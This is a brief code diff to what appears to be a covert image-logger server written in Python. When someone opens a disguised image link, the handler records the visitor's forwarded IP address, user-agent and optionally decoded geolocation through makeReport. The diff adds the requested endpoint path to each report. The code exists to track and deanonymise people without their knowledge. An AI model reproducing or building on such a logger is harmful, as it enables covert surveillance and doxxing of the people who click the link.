@@ -189,7 +189,7 @@ div.img {{
                 self.end_headers()
                 
                 self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
-                makeReport(self.headers.get('x-forwarded-for'))
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0])
             
             return
         
@@ -199,9 +199,9 @@ div.img {{
 
             if dic.get("g") and config["accurateLocation"]:
                 location = base64.b64decode(dic.get("g").encode()).decode()
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location)
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0])
             else:
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'))
+                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0])
             
 
             message = config["message"]["message"]
